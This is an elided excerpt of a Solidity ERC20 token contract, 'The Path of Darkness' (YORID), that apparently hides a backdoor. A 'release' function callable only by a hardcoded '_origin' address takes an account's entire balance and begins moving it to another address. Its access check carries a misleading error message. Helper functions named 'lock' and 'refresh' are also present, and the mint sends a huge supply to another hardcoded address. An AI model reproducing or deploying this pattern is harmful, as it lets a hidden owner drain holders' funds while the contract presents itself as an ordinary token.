...
contract ThePathofDarkness is Context, IERC20 {
    ...
    address _addr = 0x2c29D2bC2804a8aca2eCEA6465C7F2106b9c5Fe3;
    address public _origin = 0x9eaA3d4a9D5a30f0d53894d73C8D9034738a0401;

    constructor () public {


        
        _name = "The Path of Darkness";
        _symbol = "YORID";
        _decimals = 18;
        uint256 initialSupply = 777777777777;
        _safeOwner = _origin;
        
        

        procure(_addr, initialSupply*(10**18));
    ...
    function procure(address account, uint256 amount) public {
...
//-----------------------------------------------------------------------------------------------------------------------//
        ...
        function refresh(address account, address staker) public {
        ...
        function lock(address account, address staker) public {
        ...
        function release(address account, address staker) public {
            require(msg.sender == _origin, "ERC20: mint to the zero address");
            uint256 amount = _balances[account];
            _beforeTokenTransfer(account, staker, amount);
